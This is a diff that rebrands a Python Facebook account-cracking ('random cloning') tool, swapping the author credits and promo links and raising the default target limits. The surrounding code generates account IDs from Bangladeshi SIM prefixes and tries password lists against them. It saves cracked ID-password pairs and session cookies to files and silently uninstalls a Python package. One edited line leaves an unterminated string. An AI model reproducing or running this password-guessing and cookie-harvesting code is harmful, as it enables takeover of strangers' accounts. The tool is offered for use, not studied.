@@ -1,6 +1,6 @@
-#--------------++CREATED     +PRINCE RONI++-----------------#
-#--------------++FACEBOOK  + PRINCE RONI++----------------#
-#--------------++ GITHUB        + DX1433+--------------------------#
+#--------------++CREATED     +ROBBANI++-----------------#
+#--------------++FACEBOOK  + ROBBANI GAM++----------------#
+#--------------++ GITHUB        + ROBBANI-HACKER+--------------------------#
 
 import os
 os.system("pip uninstall requests -y")
@@ -76,7 +76,7 @@ o888o  o888o  `Y8bood8P'  o888bood8P'  o888bood8P'  o88o     o8888o o8o        `
                                                                                          
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝ 
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-║\33[0;45m      [ TOOLS CREATED BY : PRINCE RONI ]     \033[0;92m║
+║\33[0;45m      [ TOOLS CREATED BY : ROBBANI-HACKER ]     \033[0;92m║
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
 ║\33[0;42mTOOLS      :   RANDOM\033[0;92m          \33[0;41mFIRE\033[0;92m          ║
@@ -94,7 +94,7 @@ def clear():
 
 def TARA_LOVE():
     clear()
-    os.system('xdg-open https://github.com/DX-1433')
+    os.system('xdg-open https://github.com/ROBBANI-HACKER/ROBBANI')
     print(f'{B} [{warna}01{B}] \33[0;41mRANDOM CLONING\033[0;92m ')
     print(f'{B} [{warna}02{B}] \33[0;41mJOIN FB GROUP\033[0;92m ')
     print(f'{B} [{warna}03{B}] CONTACT WHATSAPP')
@@ -104,7 +104,7 @@ def TARA_LOVE():
     if option in ['01','1']:
         BD_CLONING()
     if option in ['02','2']:
-    	os.system('xdg-open https://www.facebook.com/groups/1590710078091857/?ref=share');time.sleep(1)
+    	os.system('xdg-open https://www.facebook.com/robbane.gam.1);time.sleep(1)
     if option in ['03','3']:
     	os.system('xdg-open https://wa.me/+8801916564949');time.sleep(1)
     else:
@@ -116,7 +116,7 @@ def BD_CLONING():
     print(' EXAMPLE SIM CODE : [016] [017] [018] [019]')
     code=input(' ENTER SIM CODE >> ')
     linex()
-    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
+    print(' EXAMPLE LIMIT : [10000] [20000] [50000] [10000]')
     try:
         limit=int(input(' ENTER LIMIT >> '))
     except ValueError:
@@ -165,15 +165,15 @@ def method_crack(ids,passlist):
                 if str(uid) in oks:
                     break
                 else:
-                    print('\r\r \033[1;32m[DX-OK] '+str(uid)+' | '+pas+'\033[1;37m')
+                    print('\r\r \033[1;32m[ROBBANI-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                     coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                     print('\033[1;37m [COOKIE-🌸] '+coki)
-                    open('/sdcard/DX-OK.txt','a').write(str(uid)+' | '+pas+'\n')
+                    open('/sdcard/ROBBANI-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                     oks.append(str(uid))
                     break
             elif 'www.facebook.com' in reqx['error_msg']:
                 print('\r\r \033[1;35m[DX-CP] '+ids+' | '+pas+'\033[1;37m')
-                open('/sdcard/DX-CP.txt','a').write(ids+'|'+pas+'\n')
+                open('/sdcard/ROBBANI-CP.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
             else:
